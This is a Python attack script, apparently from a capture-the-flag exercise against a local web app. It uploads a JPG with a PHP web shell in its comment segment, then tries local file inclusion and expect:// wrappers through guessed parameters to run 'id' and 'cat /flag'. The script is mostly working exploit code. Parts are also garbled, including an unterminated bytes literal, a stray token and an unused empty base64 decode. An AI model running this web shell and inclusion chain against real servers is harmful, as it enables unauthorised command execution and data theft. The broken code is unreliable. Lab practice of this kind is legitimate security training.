import requests
import base64
from io import BytesIO

base_url = "http://127.0.0.1:32824"

print("Uploading JPG with embedded PHP shell...")
print("=" * 60)

# Create a JPG with PHP code embedded in comment field
# Format: JPG magic + APP0 segment + comment segment with PHP
jpg_shell = base64.b64decode('')

# Inject PHP code as a comment
php_code = b"<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>
ewlinephp_code_padded = b"<?php " + b"A" * (60 - len(php_code)) + php_code

# Proper JPG structure with embedded PHP in comment segment
jpg_data = (
    b'\xff\xd8'  # SOI marker
    b'\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'  # APP0
    b'\xff\xfe\x00<' + php_code + b'\n'  # Comment segment with PHP
    b'\xff\xd9'  # EOI marker
)

print(f"JPG structure: {len(jpg_data)} bytes")

# Upload the file
files = {'userfile': ('shell_xss.jpg', BytesIO(jpg_data), 'image/jpeg')}
data = {'submit': 'Upload Image'}
resp = requests.post(f"{base_url}/index.php", files=files, data=data)
print(f"\nUpload status: {resp.status_code}")
print(f"Upload response: {resp.text[:1000]}")

# Check if it was accepted
if 'upload/' in resp.text:
    print("\n[UPLOADED SUCCESSFULLY]")
    
    # Try to access via browser (should display image at first)
    if 'shell_xss.jpg' in resp.text:
        shell_url = f"{base_url}/upload/shell_xss.jpg"
        direct_resp = requests.get(shell_url)
        print(f"\nDirect access to shell:")
        print(f"Status: {direct_resp.status_code}")
        print(f"Content-Type: {direct_resp.headers.get('Content-Type', 'unknown')}")
        print(f"First 100 bytes: {repr(direct_resp.content[:100])}")
        
        # The PHP won't execute directly via GET to the file URL
        # But it might execute if included via index.php parameter
        print("\nTesting LFI inclusion of our shell...")
        
        # Try including via index.php with the 'file' parameter
        for param in ['file', 'include', 'page']:
            include_url = f"{base_url}/index.php?{param}=upload/shell_xss.jpg&cmd=id"
            include_resp = requests.get(include_url)
            print(f"\n{param} inclusion:")
            print(f"Status: {include_resp.status_code}")
            print(f"Length: {len(include_resp.content)}")
            
            # Check if PHP executed
            content_str = include_resp.text
            if 'uid=' in content_str or 'www-data' in content_str:
                print(f"[!] COMMAND EXECUTED! Output:")
                print(content_str)
            elif 'JFIF' in content_str:
                print(f"[NOT EXECUTED] File served as image, not PHP")
            else:
                print(f"Response: {content_str[:500]}")

# Try expect wrapper approach
print("\n" + "=" * 60)
print("Testing expect:// wrapper...")

for param in ['file', 'include', 'page', 'img', 'view']:
    payload = f"expect://cat%20/flag"
    test_url = f"{base_url}/index.php?{param}={payload}"
    
    try:
        resp = requests.get(test_url, timeout=10)
        print(f"\nTesting {param}=expect://...")
        print(f"Status: {resp.status_code}")
        print(f"Length: {len(resp.content)}")
        
        if len(resp.content) < 2000:
            content = resp.text
            print(f"Content preview: {repr(resp.text[:800])}")
            
            if 'FLAG{' in content:
                print(f"[!] FLAG FOUND!")
                break
    except Exception as e:
        print(f"Error testing {param}: {e}")

print("\n" + "=" * 60)
print("Testing complete.")
